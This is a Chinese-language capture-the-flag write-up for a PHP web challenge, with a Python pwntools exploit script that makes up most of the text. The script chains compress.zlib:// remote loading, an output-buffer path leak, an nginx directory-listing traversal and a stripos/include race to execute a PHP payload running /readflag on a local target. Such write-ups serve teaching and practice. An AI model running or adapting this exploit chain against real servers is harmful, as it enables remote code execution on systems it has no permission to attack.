
### writeup

1. 利用 file_get_contents 使用协议 compress.zlib://http://remote_addr 可以加载远程文件，可以造成缓存的特点写入缓存文件

2. 保持服务端的tcp连接状态，避免clint端把临时文件删除

3. 利用大的name，让输出缓冲区被占满，可以将临时文件的目录输出出来。

4. 利用 nginx的列目录漏洞，列出临时文件的路径

5. 利用 stripos 比较大字符串比较慢的特点在下面两行代码之间产生竞争

```php

    if (stripos(file_get_contents($_POST['file']), '<?') === false) {
       include_once($_POST['file']);
    }
```


### exp 如下

```python
from pwn import *
import requests
import re
import threading
import time

for gg in range(100):

    r = remote("127.0.0.1", 80)
    l = listen(8080)
    
    data = '''name={}&file=compress.zlib://http://docker.for.mac.localhost:8080'''.format("a"*8050)

    payload = '''POST / HTTP/1.1
Host: 127.0.0.1:80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: {}
Content-Type: application/x-www-form-urlencoded
Connection: close
Cookie: PHPSESSID=asdasdasd
Upgrade-Insecure-Requests: 1

{}'''.format(len(data), data).replace("\n","\r\n")


    r.send(payload)
    try:
        r.recvuntil('your sandbox: ')
    except EOFError:
        print("[ERROR]: EOFERROR")
        # l.close()
        r.close()
        continue
    # dirname = r.recv(70)
    dirname = r.recvuntil('\n', drop=True) + '/'

    print("[DEBUG]:" + dirname)

    # send trash
    c = l.wait_for_connection()
    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8

{}'''.format('A'* 5000000).replace("\n","\r\n")
    c.send(resp)


    # get filename
    r2 = requests.get("http://127.0.0.1:80/.well-known../"+ dirname + "/")
    try:
        tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
        print("[DEBUG]:" + tmpname)
    except IndexError:
        l.close()
        r.close()
        print("[ERROR]: IndexErorr")
        continue
    def job():
        time.sleep(0.01)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    # file_get_contents and include tmp file
    exp_file = dirname + "/" + tmpname
    print("[DEBUG]:"+exp_file)
    r3 = requests.post("http://127.0.0.1:80/", data={'file':exp_file})
    print(r3.status_code,r3.text)
    if "wtf" in r3.text:
        break

    t.join()
    r.close()
    l.close()
    #r.interactive()

```
